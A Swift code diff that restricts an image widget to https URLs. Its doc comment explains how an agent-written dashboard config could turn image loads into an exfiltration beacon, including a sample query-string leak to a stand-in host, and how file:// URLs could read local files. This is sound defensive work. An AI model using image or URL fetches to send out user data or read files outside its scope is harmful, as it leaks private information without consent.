@@ -43,14 +43,53 @@ struct ImageWidgetView: View {
     private var content: some View {
         if let _ = widget.path {
             localContent
-        } else if let url = widget.url, let parsed = URL(string: url) {
+        } else if let parsed = remoteURL {
             remoteContent(url: parsed)
+        } else if let raw = widget.url, !raw.isEmpty {
+            WidgetErrorCard(
+                verbatimReason: "\(raw)\n\nOnly https:// URLs can be loaded by an image widget.",
+                title: ""
+            )
         } else {
             WidgetErrorCard(
                 title: "",
                 reason: "Image widget needs either `path` (local file relative to project root) or `url` (remote)."
             )
         }
+    }
+
+    /// The widget's remote URL, accepted only when it is `https` with a
+    /// host — the same policy `WebviewWidgetView.webURL` applies, and for
+    /// the same reasons, plus one this widget makes worse.
+    ///
+    /// `url` comes from `.scarf/dashboard.json`, which the agent writes.
+    /// Unlike the webview widget, an image widget fires its request the
+    /// moment the dashboard renders — no click, no visible chrome, nothing
+    /// the user could decline. So the widget was:
+    ///
+    /// - a **beacon**: any `http(s)://…` the agent chose was fetched on
+    ///   sight, reporting the user's IP, and (because the dashboard reloads
+    ///   on every watcher tick) doing it repeatedly. A URL is a channel;
+    ///   `https://x.example/?d=<exfiltrated>` is a GET the agent gets to make
+    ///   through the user's network from the user's machine.
+    /// - a **local file reader**: `AsyncImage` follows `file://`, so a
+    ///   widget could pull any image on the disk into a panel the agent can
+    ///   then be asked to describe — straight past `WidgetPathResolver`,
+    ///   which exists precisely to keep `path` inside the project root.
+    /// - **plaintext**: `http` is MITM-able into whatever bytes the attacker
+    ///   likes, decoded here by the system image decoders.
+    ///
+    /// Refusing everything but `https` doesn't close the beacon — a widget
+    /// that legitimately shows a remote image is a request either way — but
+    /// it closes the local-file read and the plaintext channel, and it makes
+    /// this widget no more permissive than the webview one beside it.
+    private var remoteURL: URL? {
+        guard let raw = widget.url,
+              let url = URL(string: raw),
+              url.scheme?.lowercased() == "https",
+              let host = url.host, !host.isEmpty
+        else { return nil }
+        return url
     }
 
     @ViewBuilder
